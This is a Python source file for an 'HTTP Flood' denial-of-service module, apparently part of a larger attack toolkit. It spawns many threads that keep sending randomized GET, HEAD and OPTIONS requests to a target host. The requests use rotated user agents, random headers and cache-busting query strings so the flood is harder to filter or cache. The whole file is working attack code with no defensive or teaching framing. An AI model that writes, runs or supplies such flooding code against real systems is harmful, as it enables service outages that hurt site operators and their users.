"""
HTTP Flood attack module
"""

import http.client
import time
import threading
import random
import string
from config.settings import USER_AGENTS
from utils.helpers import get_random_headers

class HTTPFlood:
    def __init__(self, target_config, config_manager, stats_manager):
        self.target_ip = target_config["ip"]
        self.target_port = target_config["port"]
        self.target_uri = target_config["uri"]
        self.config_manager = config_manager
        self.stats_manager = stats_manager
        self.is_running = False
        self.threads = []
    
    def start(self):
        """Start HTTP flood attack"""
        self.is_running = True
        config = self.config_manager.get_attack_config("http_flood")
        
        for _ in range(config["threads"]):
            thread = threading.Thread(target=self._attack_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def stop(self):
        """Stop HTTP flood attack"""
        self.is_running = False
        
        for thread in self.threads:
            thread.join(timeout=2)
    
    def _attack_worker(self):
        """HTTP flood worker thread"""
        config = self.config_manager.get_attack_config("http_flood")
        
        while self.is_running:
            try:
                conn = http.client.HTTPConnection(self.target_ip, self.target_port, timeout=2)
                
                # Randomized request
                ua = random.choice(USER_AGENTS)
                cache_buster = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
                
                headers = {
                    "User-Agent": ua,
                    "Connection": "close",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                }
                
                # Add random headers
                headers.update(get_random_headers(2, 5))
                
                # Vary request methods and URIs
                methods = ["GET", "HEAD", "OPTIONS"]
                method = random.choice(methods)
                
                uris = [self.target_uri, "/index.html", "/admin", "/login"]
                uri = random.choice(uris)
                
                conn.request(method, f"{uri}?__cache_buster={cache_buster}", headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()

                self.stats_manager.increment_http_requests()
                
            except Exception:
                pass
            
            time.sleep(config["delay"])